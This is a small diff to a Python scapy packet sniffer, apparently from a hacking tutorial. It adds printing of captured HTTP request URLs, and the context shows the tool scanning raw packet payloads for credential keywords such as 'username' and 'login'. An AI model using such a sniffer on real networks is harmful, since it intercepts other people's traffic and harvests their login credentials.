@@ -11,6 +11,9 @@ def sniffer(interface):
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + \
+            packet[http.HTTPRequest].Path
+        print(url)
         if packet.haslayer(scapy.Raw):
             load_as_str = str(packet[scapy.Raw].load)
             keywords = ['username', 'uname', 'login',
